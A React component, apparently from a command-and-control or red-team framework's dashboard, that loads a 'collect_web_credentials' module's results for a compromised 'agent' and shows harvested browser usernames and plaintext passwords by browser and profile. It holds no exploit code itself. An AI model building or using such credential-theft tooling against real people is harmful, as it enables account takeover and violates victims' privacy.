"use client";
import React, { useEffect, useState } from "react";
import { Agent } from "@/lib/types";
import useAuthApi from "@/lib/fetchApiClient";
import useTaskRunner from "@/lib/hooks/useTaskRunner";
import Loading from "@/components/Loading";

// Data structures
interface CredentialRecord {
    url: string;
    created: string;
    last_used: string;
    username: string;
    password: string | null;
}
interface BrowserProfile {
    profile: string;
    credentials: CredentialRecord[];
}
interface BrowserInfo {
    browser: string;
    profiles: BrowserProfile[];
}

interface WebCredentialResponse {
    browsers: BrowserInfo[];
}

interface WebCredentialsPanelProps {
    agent: Agent;
}

/**
 * Renders a "Web Credentials" panel:
 * - A dropdown to select browser
 * - A dropdown to select profile
 * - A table of credentials
 */
export default function WebCredentialsPanel({ agent }: WebCredentialsPanelProps) {
    const { authGetApi } = useAuthApi(); // or your custom fetch method
    const [data, setData] = useState<BrowserInfo[] | null>(null);
    const [loading, setLoading] = useState<boolean>(false);
    const [error, setError] = useState<string | null>(null);

    // States for selection
    const [selectedBrowser, setSelectedBrowser] = useState<string>("");
    const [selectedProfile, setSelectedProfile] = useState<string>("");

    const { getTaskResults } = useTaskRunner();


    useEffect(() => {
        fetchWebCredentials();
    }, [agent.AgentId]);

    // 1) Fetch data from server
    async function fetchWebCredentials() {
        try {
            setLoading(true);
            setError(null);

            const endpoint = `/agents/${agent.AgentId}/modules/collection/passwords/collect_web_credentials`;
            const resp: WebCredentialResponse = await getTaskResults(endpoint);

            if (!resp?.browsers) {
                setData([]);
            } else {
                setData(resp.browsers);
            }

            setLoading(false);
        } catch (err) {
            console.error("Failed to fetch web credentials:", err);
            setError("Error loading browser credentials.");
            setLoading(false);
        }
    }

    // 2) When user selects a different browser => reset profile
    function handleBrowserChange(e: React.ChangeEvent<HTMLSelectElement>) {
        const newBrowser = e.target.value;
        setSelectedBrowser(newBrowser);
        setSelectedProfile(""); // reset
    }
    // 3) When user picks a profile
    function handleProfileChange(e: React.ChangeEvent<HTMLSelectElement>) {
        setSelectedProfile(e.target.value);
    }

    // 4) Logic to find the "current" profile's credentials
    function getCurrentCredentials(): CredentialRecord[] {
        if (!data || !selectedBrowser) return [];
        const browserObj = data.find((b) => b.browser === selectedBrowser);
        if (!browserObj) return [];

        // If user hasn't chosen a profile, pick the first?
        // Or rely on user picking from dropdown
        const profileName = selectedProfile || browserObj.profiles[0]?.profile;
        if (!profileName) return [];

        const profObj = browserObj.profiles.find((p) => p.profile === profileName);
        if (!profObj) return [];
        return profObj.credentials || [];
    }

    if (loading) return <Loading text="Loading Web Credentials..." />;
    if (error) return <div className="text-danger">{error}</div>;
    if (!data || data.length === 0) {
        return (
            <div className="card bg-dark text-white" style={{ borderRadius: 16 }}>
                <div className="card-body">No browser credentials found.</div>
            </div>
        );
    }

    // Prepare the browser list and profile list for the UI
    const browserNames = data.map((b) => b.browser);
    let profileNames: string[] = [];
    if (selectedBrowser) {
        const found = data.find((b) => b.browser === selectedBrowser);
        if (found) {
            profileNames = found.profiles.map((p) => p.profile);
        }
    }

    const credentials = getCurrentCredentials();

    return (
        <div className="card bg-dark text-white web-cred-panel" style={{ borderRadius: 16 }}>
            <div className="card-header d-flex justify-content-between align-items-center">
                <h5 className="mb-0" style={{ fontFamily: "Orbitron, sans-serif" }}>
                    Web Credentials
                </h5>
                <button
                    className="btn btn-sm btn-secondary d-flex align-items-center"
                    onClick={() => fetchWebCredentials()}
                >
                    <i className="bi bi-arrow-clockwise me-1" />
                    Refresh
                </button>
            </div>

            <div className="card-body">
                {/* A row for the two <select> elements (browser / profile) */}
                <div className="row g-2 mb-3">
                    <div className="col-sm-auto">
                        <label className="form-label mb-1" style={{ fontSize: "0.9rem" }}>Browser</label>
                        <select
                            className="form-select form-select-sm bg-secondary text-white"
                            value={selectedBrowser}
                            onChange={handleBrowserChange}
                        >
                            <option value="">-- Select Browser --</option>
                            {browserNames.map((bn) => (
                                <option key={bn} value={bn}>
                                    {bn}
                                </option>
                            ))}
                        </select>
                    </div>

                    <div className="col-sm-auto">
                        <label className="form-label mb-1" style={{ fontSize: "0.9rem" }}>Profile</label>
                        <select
                            className="form-select form-select-sm bg-secondary text-white"
                            value={selectedProfile}
                            onChange={handleProfileChange}
                            disabled={!selectedBrowser}
                        >
                            <option value="">-- Select Profile --</option>
                            {profileNames.map((pn) => (
                                <option key={pn} value={pn}>
                                    {pn}
                                </option>
                            ))}
                        </select>
                    </div>
                </div>

                {/* Show table of credentials if any */}
                {(!selectedBrowser || !selectedProfile) ? (
                    <p className="text-muted">Please select a browser and profile.</p>
                ) : credentials.length === 0 ? (
                    <p className="text-muted">No credentials found for this profile.</p>
                ) : (
                    <div className="table-responsive">
                        <table className="table table-dark table-hover table-sm mb-0 credential-table table-fixed">
                            <thead>
                                <tr>
                                    <th>URL</th>
                                    <th>Created</th>
                                    <th>Last Used</th>
                                    <th>Username</th>
                                    <th>Password</th>
                                </tr>
                            </thead>
                            <tbody>
                                {credentials.map((c, idx) => (
                                    <tr key={idx}>
                                        <td>{c.url}</td>
                                        <td>{c.created}</td>
                                        <td>{c.last_used}</td>
                                        <td>{c.username || "N/A"}</td>
                                        <td>{c.password || "None"}</td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                )}
            </div>
        </div>
    );
}
